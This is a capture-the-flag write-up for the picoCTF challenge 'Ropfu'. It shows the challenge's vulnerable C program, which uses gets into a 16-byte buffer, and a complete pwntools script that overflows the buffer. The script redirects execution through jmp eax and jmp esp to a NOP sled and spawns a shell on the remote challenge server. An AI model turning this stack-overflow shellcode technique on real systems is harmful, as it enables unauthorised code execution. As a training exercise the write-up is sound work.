# Write-up of the challenge "Ropfu"

This challenge is part of the "Binary exploitation" category and is in the hard category.

# Goal of the challenge

The objective of the challenge is just to input something and then somehow get the flag.

## Program structure

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 16

void vuln() {
  char buf[16];
  printf("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n");
  return gets(buf);

}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  
}


```

## Problem

So first I actually tried to do **"ret2syscall"** but the problem was that a gadget did not have the ret. So I tried to get over it by using a ret gadget after that gadget but it failed. So after some research I just decided to go with **"ret2shellcode"** instead.

## Security breach

This is bad **"return gets(buf);"** because we can buffer overflow and overrite "$RIP".


## Solution

So I just realized that we had **"jmp eax"** in our binary, but we also need **"jmp esp"**. So what I did was just use the opcode for **"jmp esp"**.

After doing a **"cyclic pattern"**, I found out that to overwrite the **"$RIP"** we need an offset of 28. So my idea was to put 27 NOPs and then put the **"jmp esp"**. At the **"$RIP"**, we put the jmp_eax, and then we put our shell. So what this will do is that we go to the **"$RIP"**, which has the value jmp_eax; it will jump to the start of the buffer and go back to the NOPs. When the NOPs are executed, it will then go to **"jmp esp"** and jump on top of the stack, where our shell will be.


```python
#!/usr/bin/env python3

from pwn import *
import re

context.arch = 'i386'

# p = process('./vuln')
p = remote('saturn.picoctf.net', 57312)

elf = ELF('vuln')
rops = ROP(elf)

offset = 28

jmp_eax = p32(0x0805333b)
jmp_esp = b'\xff\xe4'

payload = b'\x90' * (offset - 2) + jmp_esp + jmp_eax + asm(shellcraft.sh())

# First add nop slides 26 then add jmp esp and then jmp eax. Eax often has start of buffer so we say go back to the start of the buffer
# When it goes back it will later go through the jmp_esp which is saying point to the latest in stack which is the shell

p.sendline(payload)

p.interactive()


```

After excuting the script we get the flag back!

If you liked this writeup you can star my repository.